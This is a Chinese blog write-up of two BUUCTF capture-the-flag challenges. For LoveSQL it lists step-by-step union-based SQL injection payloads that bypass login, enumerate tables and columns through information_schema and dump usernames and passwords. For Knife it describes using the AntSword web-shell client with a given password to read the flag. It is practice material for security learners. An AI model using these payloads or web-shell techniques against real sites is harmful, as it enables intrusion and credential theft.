BUU-LoveSQL、Knife

Created2022-04-24|Updated2022-04-24
|Post View:

1、LoveSQL
SQL注入，上来就是 1’ or 1=1# ，但是进来了好像也没什么用

接下来老实一步一步走
找字段数1’ union select 1,2,3#或者1’ order by 3#，发现字段数有三个
找回显点1’ union select 1,2,3#，是2，3两处

找数据库名
1’ union select 1,2,database()#
找到库名为 geek
接下来爆表名1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’geek’#

爆字段名1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’#

想着flag应该在password里，那么1’ union select 1,2,group_concat(password) from l0ve1ysq1#拿到flag
也可以在1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1#里面找

很老实的题目，复习了一次SQL注入

2、Knife
打开后是这样子👇

他家菜刀丢了，我们不想找了，给他把蚁剑把，也能切菜不是？
把题丢进蚁剑里边，密码为题目给的Syc
进入后很快发现了flag……就结束了……

另一种姿势👇
发现题目标题为“白给的Shell”，而一般shell在index.php文件中，于是我们打开http://c4a7397a-0bed-4acc-a77b-ab4cd929fc30.node4.buuoj.cn:81/index.php
可是没有任何变化…那就丢给蚁剑剁碎！！！可是蚁剑打开后仍和前面一样
这时候打开蚁剑虚拟终端，cat /flag，拿到flag

发现缺漏：对蚁剑不熟练，其虚拟终端功能第一次接触
